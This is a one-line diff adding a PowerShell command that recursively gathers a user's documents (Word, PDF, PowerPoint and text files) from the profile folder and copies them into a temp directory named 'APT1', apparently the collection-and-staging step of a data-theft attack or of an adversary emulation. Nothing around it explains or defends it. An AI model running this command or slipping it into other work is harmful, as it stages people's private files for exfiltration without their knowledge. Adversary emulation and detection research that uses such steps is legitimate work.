@@ -1,0 +1,1 @@
+Get-ChildItem  $env:USERPROFILE -Recurse -Include *.doc,*.docx,*.pdf,*.ppt,*.pptx,*.txt | %{Copy-Item $_.FullName -destination $env:temp\APT1\}
